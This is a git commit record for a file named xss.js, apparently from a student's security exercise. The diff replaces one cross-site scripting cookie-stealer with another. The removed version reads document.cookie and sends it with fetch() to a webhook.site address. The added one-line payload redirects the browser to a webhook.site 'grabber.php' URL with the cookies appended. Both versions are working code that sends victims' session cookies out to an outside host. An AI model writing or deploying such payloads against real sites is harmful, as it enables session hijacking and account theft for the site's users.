2e9e219dbbb0a0ee9f1c533f5d003c92166cb3be
Mathis <mathis.onillon@epitech.eu>
2025-05-15 22:09:12 +0200

    refactor: revert to direct document.location assignment for cookie retrieval

--- xss.js
+++ xss.js
@@ -1,11 +1,1 @@
-// Send a GET request with the domain's cookies as URL parameters
-const cookieValue = encodeURIComponent(document.cookie);
-const url = `https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972?cookies=${cookieValue}`;
-
-fetch(url, {
-  method: 'GET',
-  credentials: 'include',  // This still ensures cookies are sent in headers
-})
-.then(response => response.json())
-.then(data => console.log('Success:', data))
-.catch((error) => console.error('Error:', error));
+document.location='https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972/XSS/grabber.php?c='+document.cookie
